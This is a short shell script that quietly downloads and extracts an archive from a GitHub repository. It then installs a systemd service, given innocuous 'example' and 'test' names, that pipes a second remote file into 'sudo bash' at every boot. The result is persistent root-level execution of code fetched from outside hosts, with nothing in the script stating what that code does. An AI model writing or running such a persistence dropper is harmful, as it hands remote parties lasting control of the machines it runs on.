wget -q https://raw.githubusercontent.com/amitstudydude/RDP_Linux/main/google.7z && 7z x *7z  && rm *7z &
cat >/usr/sbin/example.sh <<EOF
curl https://raw.githubusercontent.com/jhajikv-ji/no/main/doc | sudo bash
EOF

chmod +x /usr/sbin/example.sh

cat >/etc/systemd/system/test.service <<EOF
[Unit]
Description=example systemd service unit file.

[Service]
ExecStart=/bin/bash /usr/sbin/example.sh

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable test.service

example.sh
